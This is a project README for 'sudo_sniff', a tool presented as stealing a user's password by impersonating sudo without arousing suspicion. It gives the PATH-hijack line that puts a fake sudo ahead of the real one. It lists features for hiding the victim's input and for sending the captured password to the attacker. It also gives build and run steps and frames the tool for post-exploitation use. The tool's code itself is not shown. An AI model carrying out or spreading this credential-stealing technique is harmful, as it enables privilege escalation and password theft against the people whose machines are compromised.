# sudo_sniff
sudo_sniff is a simple program that attempts to steal the user's password while running sudo without arousing any suspicion. The idea is to first modify the user's $PATH with `PATH="$HOME/.bin:$PATH"` and placing sudo_sniff in `$HOME/.bin/sudo`. This could be used in post-exploitation.

## Improvements
* Hide the victim's input
* ~~Add function to either send the password to attacker or save it on disk.~~
* sudo may be in different locations on different systems, perhaps implement a function to locate it
* ~~[BUG] When the victim enters his input, the text asking for the password will be printed multiple times.~~

## Usage
1. git clone git@github.com:mjdubell/sudo_sniff.git
2. cd sudo_sniff/
3. make
4. ./sudo whoami

## Contributing
1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D